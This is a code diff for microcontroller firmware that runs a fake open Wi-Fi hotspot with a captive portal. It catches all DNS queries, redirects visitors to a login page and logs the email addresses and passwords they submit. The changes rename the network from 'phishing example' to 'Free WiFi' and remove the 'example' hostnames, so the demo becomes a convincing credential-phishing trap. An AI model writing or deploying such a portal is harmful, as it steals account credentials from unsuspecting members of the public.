@@ -63,7 +63,7 @@ httpDefault()
 {
   logline << server.client().remoteIP() << " redirect";
   appendLog();
-  server.sendHeader("Location", "http://examplecaptive.lan/", true);
+  server.sendHeader("Location", "http://captive.lan/", true);
   server.send(302, "text/plain", "");
   server.client().stop();
 }
@@ -71,7 +71,7 @@ httpDefault()
 void
 httpHome()
 {
-  if (server.hostHeader() != String("examplecaptive.lan")) {
+  if (server.hostHeader() != String("captive.lan")) {
     return httpDefault();
   }
 
@@ -85,8 +85,8 @@ httpHome()
 void
 httpConnect()
 {
-  logline << server.client().remoteIP() << " connect " << server.arg("email");
-  logline << server.client().remoteIP() << server.arg("password");
+  logline << server.client().remoteIP() << " connected. Email: " << server.arg("email");
+  logline << " Password: " << server.arg("password");
   appendLog();
   File file = SPIFFS.open("/connect.htm.gz", "r");
   server.streamFile(file, "text/html");
@@ -96,7 +96,7 @@ httpConnect()
 void
 httpPureCss()
 {
-  File file = SPIFFS.open("/pure.css.gz", "r");
+  File file = SPIFFS.open("/pure-min.css.gz", "r");
   server.streamFile(file, "text/css");
   file.close();
 }
@@ -127,7 +127,7 @@ setup()
   wifiStaDisconnectHandler = WiFi.onSoftAPModeStationDisconnected(wifiStaDisconnect);
   WiFi.mode(WIFI_AP);
   WiFi.softAPConfig(apIp, apIp, IPAddress(255, 255, 255, 0));
-  WiFi.softAP("phishing example", nullptr, 1);
+  WiFi.softAP("Free WiFi", nullptr, 1);
 
   dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
   dnsServer.start(53, "*", apIp);
